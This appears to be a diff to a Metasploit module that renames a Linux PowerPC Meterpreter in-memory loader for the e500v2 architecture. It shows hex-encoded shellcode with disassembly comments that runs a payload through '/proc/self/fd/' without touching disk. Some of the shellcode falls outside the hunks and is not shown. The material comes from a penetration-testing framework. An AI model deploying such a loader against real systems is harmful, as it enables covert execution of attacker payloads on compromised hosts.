@@ -5,10 +5,10 @@
 # Resource and Credits: https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
 #
 
-module Msf::Payload::Linux::Ppc::MeterpreterLoader
+module Msf::Payload::Linux::Ppce500v2::MeterpreterLoader
+  
   def in_memory_loader(payload)
     in_memory_loader = [
-
       0x48000084, # 0x1000:	b	0x1084	0x48000084
       0x7de802a6, # 0x1004:	mflr	r15	0x7de802a6
       0x39c00000, # 0x1008:	li	r14, 0	0x39c00000
@@ -43,13 +43,10 @@ module Msf::Payload::Linux::Ppc::MeterpreterLoader
       0x3800000b, # 0x107c:	li	r0, 0xb	0x3800000b
       0x44000002, # 0x1080:	sc		0x44000002
       0x4bffff81, # 0x1084:	bl	0x1004	0x4bffff81
-
       payload.length
     ].pack('N*')
-
     fd_path = '/proc/self/fd/'.bytes.pack('C*') + "\x2f" * 14 + "\x00" * 2
     in_memory_loader+fd_path
   end
 
 end
-
